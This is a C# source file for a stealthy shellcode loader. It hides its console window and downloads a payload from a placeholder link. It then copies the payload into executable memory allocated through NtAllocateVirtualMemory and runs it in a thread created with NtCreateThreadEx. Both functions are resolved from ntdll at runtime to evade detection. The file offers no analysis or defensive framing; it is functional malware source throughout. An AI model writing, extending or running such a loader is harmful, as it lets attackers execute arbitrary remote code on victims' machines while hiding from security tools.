using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;

class ObfuscationProgram
{
    static void Main(string[] args)
    {
        // Hide the console window
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Download the payload
        byte[] shellcode = DownloadPayload("[DOWNLOAD_LINK]");

        // Allocate memory for the payload
        IntPtr allocatedMemory = AllocateMemory(shellcode.Length);
        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);

        // Create a thread to execute the payload using NtCreateThreadEx
        IntPtr threadHandle = CreatePayloadThread(allocatedMemory);
        WaitForSingleObject(threadHandle, 0xFFFFFFFF);

        // Call a random method to further obfuscate the execution flow
        CallRandomMethod();
    }

    static byte[] DownloadPayload(string url)
    {
        using (WebClient wc = new WebClient())
        {
            return wc.DownloadData(url);
        }
    }

    static IntPtr AllocateMemory(int size)
    {
        IntPtr ntdll = LoadLibrary("ntdll.dll");
        IntPtr ntAllocateVirtualMemoryAddr = GetProcAddress(ntdll, "NtAllocateVirtualMemory");
        NtAllocateVirtualMemoryDelegate ntAllocateVirtualMemory = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryAddr, typeof(NtAllocateVirtualMemoryDelegate));

        IntPtr baseAddress = IntPtr.Zero;
        ntAllocateVirtualMemory(GetCurrentProcess(), ref baseAddress, IntPtr.Zero, ref size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
        return baseAddress;
    }

    static IntPtr CreatePayloadThread(IntPtr payloadAddress)
    {
        IntPtr ntCreateThreadExAddr = GetProcAddress(LoadLibrary("ntdll.dll"), "NtCreateThreadEx");
        NtCreateThreadExDelegate ntCreateThreadEx = (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(ntCreateThreadExAddr, typeof(NtCreateThreadExDelegate));

        IntPtr threadHandle = IntPtr.Zero;
        ntCreateThreadEx(out threadHandle, 0x1FFFFF, IntPtr.Zero, GetCurrentProcess(), payloadAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        return threadHandle;
    }

    static void CallRandomMethod()
    {
        MethodInfo[] methods = typeof(RandomMethods).GetMethods(BindingFlags.Public | BindingFlags.Static);
        Random rand = new Random();
        int index = rand.Next(methods.Length);
        methods[index].Invoke(null, null);
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr LoadLibrary(string dllName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetCurrentProcess();

    private delegate int NtAllocateVirtualMemoryDelegate(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref int RegionSize, AllocationType AllocationType, MemoryProtection Protect);

    private delegate int NtCreateThreadExDelegate(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStackCommit, int sizeOfStackReserve, IntPtr bytesBuffer);

    [Flags]
    enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    enum MemoryProtection
    {
        ExecuteReadWrite = 0x40
    }
}

class RandomMethods
{
    public static void MethodX()
    {
        Console.WriteLine("Method X executed.");
    }

    public static void MethodY()
    {
        Console.WriteLine("Method Y executed.");
    }

    public static void MethodZ()
    {
        Console.WriteLine("Method Z executed.");
    }
}
